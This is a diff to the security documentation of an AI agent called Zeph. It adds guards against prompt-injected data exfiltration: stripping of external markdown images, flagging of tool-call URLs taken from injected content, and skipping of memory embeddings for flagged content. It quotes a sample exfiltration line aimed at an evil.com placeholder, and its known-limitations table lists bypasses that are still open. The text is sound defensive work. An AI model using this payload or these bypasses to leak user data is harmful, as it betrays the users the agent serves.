@@ -137,7 +137,7 @@ All options default to their most secure values — you only need to add this se
 
 ## Metrics
 
-Five counters in the metrics system track sanitizer and quarantine activity:
+Eight counters in the metrics system track sanitizer, quarantine, and exfiltration guard activity:
 
 | Metric | Description |
 |--------|-------------|
@@ -146,6 +146,9 @@ Five counters in the metrics system track sanitizer and quarantine activity:
 | `sanitizer_truncations` | Number of content items truncated to `max_content_size` |
 | `quarantine_invocations` | Number of quarantine extraction calls made |
 | `quarantine_failures` | Number of quarantine calls that failed (fallback used) |
+| `exfiltration_images_blocked` | Markdown images stripped from LLM output |
+| `exfiltration_urls_flagged` | Suspicious tool URLs matched against flagged content |
+| `exfiltration_memory_guarded` | Memory writes skipped due to injection flags |
 
 These are visible in the TUI metrics panel and in the `GET /metrics` gateway endpoint (when enabled).
 
@@ -238,6 +241,45 @@ Enable the quarantined summarizer when:
 
 The quarantine call adds the full remote LLM round-trip latency to each qualifying tool result. Use a fast, inexpensive model for the quarantine provider to minimize cost and latency.
 
+## Exfiltration Guards
+
+Even with spotlighting and quarantine in place, an LLM that partially follows injected instructions can attempt to exfiltrate data through outbound channels. Exfiltration guards add three output-side checks that run **after** the LLM generates a response:
+
+### Markdown Image Blocking
+
+LLM output is scanned for external markdown images that could be used for pixel-tracking exfiltration — an attacker embeds `![t](https://evil.com/leak?data=SECRET)` in a tool result, and the LLM echoes it. The guard strips both inline and reference-style images with `http://` or `https://` URLs, replacing them with `[image removed: <url>]`. Local paths (`./img.png`) and `data:` URIs are not affected.
+
+Detection covers:
+- Inline images: `![alt](https://example.com/track.gif)`
+- Reference-style images: `![alt][ref]` + `[ref]: https://example.com/img`
+- Percent-encoded URLs (decoded before matching)
+
+### Tool URL Validation
+
+When the `ContentSanitizer` flags injection patterns in a tool result, URLs from that content are extracted and tracked for the current turn. If the LLM subsequently issues a tool call whose arguments contain any of those flagged URLs, the guard emits a `SuspiciousToolUrl` event. Tool execution is **not blocked** (to avoid breaking legitimate workflows where the same URL appears in search results and fetch calls), but the event is logged and counted.
+
+URL extraction from tool arguments uses recursive JSON value traversal (handling nested objects, arrays, and escaped slashes) rather than raw regex, preventing JSON-encoding bypasses.
+
+### Memory Write Guard
+
+When injection patterns are detected in content, the guard prevents that content from being embedded into Qdrant semantic search. The message is still saved to SQLite for conversation continuity, but omitting the Qdrant embedding stops poisoned content from appearing in future semantic memory recalls — breaking the "memory poisoning" attack chain described above.
+
+### Configuration
+
+```toml
+[security.exfiltration_guard]
+# Strip external markdown images from LLM output.
+block_markdown_images = true
+
+# Cross-reference tool call arguments against URLs from flagged content.
+validate_tool_urls = true
+
+# Skip Qdrant embedding for messages with injection flags.
+guard_memory_writes = true
+```
+
+All three toggles default to `true`. Disable individual guards only if you have a specific reason (e.g., your workflow legitimately generates external markdown images).
+
 ## Defense-in-Depth
 
 Content isolation is one layer of a broader security model. No single defense is sufficient — the "Agents Rule of Two" research demonstrated 100% bypass of all individual defenses via adaptive red-teaming. Zeph combines:
@@ -245,10 +287,11 @@ Content isolation is one layer of a broader security model. No single defense is
 1. **Spotlighting** — XML delimiters signal data vs. instructions to the LLM
 2. **Injection pattern detection** — flags known attack phrases
 3. **Quarantined summarizer** — Dual LLM pattern extracts facts from high-risk sources
-4. **System prompt reinforcement** — instructs the LLM on delimiter semantics
-5. **Shell sandbox** — limits filesystem access even if injection succeeds
-6. **Permission policy** — controls which tools the agent can call
-7. **Audit logging** — records all tool executions for post-incident review
+4. **Exfiltration guards** — block markdown image leaks, flag suspicious tool URLs, guard memory writes
+5. **System prompt reinforcement** — instructs the LLM on delimiter semantics
+6. **Shell sandbox** — limits filesystem access even if injection succeeds
+7. **Permission policy** — controls which tools the agent can call
+8. **Audit logging** — records all tool executions for post-incident review
 
 ## Known Limitations
 
@@ -258,6 +301,9 @@ Content isolation is one layer of a broader security model. No single defense is
 | No hard-block mode (flag-only, never removes content) | Planned |
 | `inject_code_context` (code indexing feature) not sanitized | Planned |
 | Quarantine circuit-breaker for repeated failures | Planned |
+| Percent-encoded scheme bypass in markdown images (`%68ttps://`) | Planned (Phase 5) |
+| HTML `<img src="...">` tag exfiltration | Planned (Phase 5) |
+| Unicode zero-width joiner in markdown image syntax | Planned (Phase 5) |
 
 ## References
 
